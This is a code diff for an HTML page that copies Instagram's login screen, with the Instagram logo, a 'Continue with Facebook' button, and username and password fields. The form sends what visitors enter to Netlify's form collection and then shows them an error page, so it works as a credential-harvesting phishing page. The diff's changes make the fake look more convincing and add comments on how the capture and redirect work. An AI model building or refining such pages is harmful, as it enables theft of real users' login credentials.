@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LogIn | Instagram</title>
+    <title>Log In | Instagram</title>
     <link rel="stylesheet" href="index.css">
     <link rel="shortcut icon" href="res/instagram-new.png">
 </head>
@@ -14,14 +14,15 @@
     <div id="wrapper">
         <div class="main-content">
             <div class="header">
-                <img src="res/ig.png" alt="helo">
+                <img src="res/ig.png" alt="Instagram Logo">
             </div>
             <br>
 
             <div>
                 <div class="btn1">
-                    <img src="res/facebook.png" style="float: left;" class="icon" alt="">
-                    <input type="button" onclick='window.location ="error.html";' value="Continue with Facebook"
+                    <img src="res/facebook.png" style="float: left;" class="icon" alt="Facebook Icon">
+                    <!-- Redirect to error.html on button click -->
+                    <input type="button" onclick='window.location.href="error.html";' value="Continue with Facebook"
                         style="float: right;" class="btn2" />
                 </div>
             </div>
@@ -31,6 +32,7 @@
             </div>
 
             <div class="l-part">
+                <!-- Netlify form handling -->
                 <form name="contact" method="POST" action="error.html" data-netlify="true">
                     <input type="hidden" name="form-name" value="contact" />
                     <input type="text" name="username" placeholder="Username" class="input-1" required />
@@ -38,6 +40,7 @@
                         <input type="password" name="password" placeholder="Password" class="input-2" required />
                         <a href="error.html">Forgot?</a>
                     </div>
+                    <!-- Submit button redirects to error.html -->
                     <input type="submit" class="btn" value="Log In">
                 </form>
             </div>
@@ -45,7 +48,8 @@
 
         <div class="sub-content">
             <div class="s-part">
-                Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/?hl=en">&nbsp;Sign up</a>
+                Don't have an account?
+                <a href="https://www.instagram.com/accounts/emailsignup/?hl=en">&nbsp;Sign up</a>
             </div>
         </div>
     </div>
